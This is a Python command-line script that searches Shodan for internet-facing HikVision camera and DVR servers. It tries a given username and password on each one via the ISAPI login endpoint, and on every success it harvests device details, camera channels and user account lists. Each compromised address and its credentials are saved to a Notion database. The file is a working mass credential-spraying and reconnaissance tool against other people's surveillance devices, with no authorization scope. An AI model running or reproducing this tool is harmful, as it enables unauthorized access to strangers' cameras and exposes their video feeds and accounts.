#!/usr/bin/env python3
try:
    import click
    import shodan
    import requests
    import json
    import xmltodict
    from rich import print
    from requests.auth import HTTPDigestAuth
    from rich.progress import Progress
    from notion.client import NotionClient
    from notion.block import CodeBlock

except ImportError:
    print("Import Error!")
    print("Make sure you have installed all the requirements.")
    exit()


class Camera:
    address = "127.0.0.1"
    port = "80"

    username = None
    password = None

    users = []
    cameras = []
    device = {}

    def __init__(self, address, port):
        self.address = address
        self.port = port

    def to_dict(self):
        return {"address": {"ip": self.address, "port": self.port, "link": f"http://{self.address}:{self.port}/"}, "credentials": {"username": self.username, "password": self.password}, "info": self.device, "users": self.users, "cameras": self.cameras}

    def check_creds(self, username, password):
        try:
            # Check if this is a HikVision device.
            response = requests.get(
                f"http://{self.address}:{self.port}/doc/ui/images/config-icons.png", verify=False, timeout=5)

            if response.status_code != 200:
                return False

            response = requests.get(
                f"http://{username}:{password}@{self.address}:{self.port}/ISAPI/Security/userCheck", verify=False, timeout=5)

            if response.status_code == 200:
                self.username = username
                self.password = password

                return True

        except:
            return False

    def get_cameras(self):
        response = requests.get(
            f"http://{self.address}:{self.port}/ISAPI/System/Video/inputs/channels", verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))

        cameras = []

        try:
            if response.status_code == 200:
                dictionary = xmltodict.parse(
                    response.text, dict_constructor=dict, force_list="VideoInputChannel")

                for camera in dictionary["VideoInputChannelList"]["VideoInputChannel"]:
                    cameras.append({"id": camera["id"][0], "name": camera["name"], "resolution": camera["resDesc"]})
        except:
            pass

        response = requests.get(f"http://{self.address}:{self.port}/ISAPI/ContentMgmt/InputProxy/channels",
                                verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))

        try:
            if response.status_code == 200:
                dictionary = xmltodict.parse(response.text, dict_constructor=dict)

                for camera in dictionary["InputProxyChannelList"]["InputProxyChannel"]:
                    cameras.append({"id": str(camera["id"]), "name": camera["name"], "resolution": "Proxy"})
        except:
            pass

        self.cameras = cameras
        return cameras

    def get_device(self):
        response = requests.get(f"http://{self.address}:{self.port}/ISAPI/System/deviceInfo",
                                verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))

        if response.status_code == 200:
            dictionary = xmltodict.parse(response.text, dict_constructor=dict)
            device = dictionary["DeviceInfo"]

            self.device = {"name": device["deviceName"], "model": device["model"], "firmware": device["firmwareVersion"]}

            return self.device

    def get_users(self):
        response = requests.get(f"http://{self.address}:{self.port}/ISAPI/Security/users",
                                verify=False, timeout=5, auth=HTTPDigestAuth(self.username, self.password))

        if response.status_code == 200:
            dictionary = xmltodict.parse(response.text, dict_constructor=dict, force_list="User")
            users = []

            for user in dictionary["UserList"]["User"]:
                users.append({"id": user["id"], "username": user["userName"],
                              "level": user["userLevel"]})

            self.users = users

            return users


@click.group()
def main():
    pass


@main.command(help="Checks credentials of HikVision cameras.")
@click.option("--shodan_key", envvar="SHODAN_KEY", required=True, help="Shodan API Key")
@click.option("--query", "-q", default="Server: DNVRS-Webs")
@click.option("--notion_key", required=True, help="Notion API Key")
@click.option("--database", required=True, help="Link to database block in Notion")
@click.option("--username", "-u", default="admin")
@click.option("--password", "-p", required=True)
def search(shodan_key, query, notion_key, database, username, password):
    shodan_api = shodan.Shodan(shodan_key)
    notion_api = NotionClient(token_v2=notion_key)

    count = shodan_api.count(query)
    matches = []

    print(f"Trying out {count['total']} hosts!")

    with Progress() as progress:
        task = progress.add_task("Please wait...", total=count['total'])

        for item in shodan_api.search_cursor(query, minify=True, retries=5):
            camera = Camera(item["ip_str"], item["port"])

            if camera.check_creds(username, password):
                camera.get_device()
                camera.get_cameras()
                camera.get_users()

                matches.append(camera)

                print(f"Address: {camera.address}:{camera.port} [italic green]Success! Logged In![/italic green]")

            progress.advance(task)

    print(f"Search done! Found {len(matches)}/{count['total']} matches!")

    table = notion_api.get_collection_view(database)

    for id, camera in enumerate(matches):
        print("")
        print(f"{id}.", camera.to_dict())

        if table.collection.get_rows(search=f"{camera.address}:{camera.port}")[0].title != f"{camera.address}:{camera.port}":
            row = table.collection.add_row()
            row.name = f"{camera.address}:{camera.port}"
            row.cameras = len(camera.cameras)
            row.users = len(camera.users)
            row.address = f"http://{camera.address}:{camera.port}/"

            page = notion_api.get_block(row.id)
            page.children.add_new(CodeBlock, title=json.dumps(camera.to_dict(), indent=4, sort_keys=True))

            print("[italic green]Success! Added to database...[/italic green]")
        else:
            print("[italic red]Already added to database...[/italic red]")


if __name__ == "__main__":
    main()
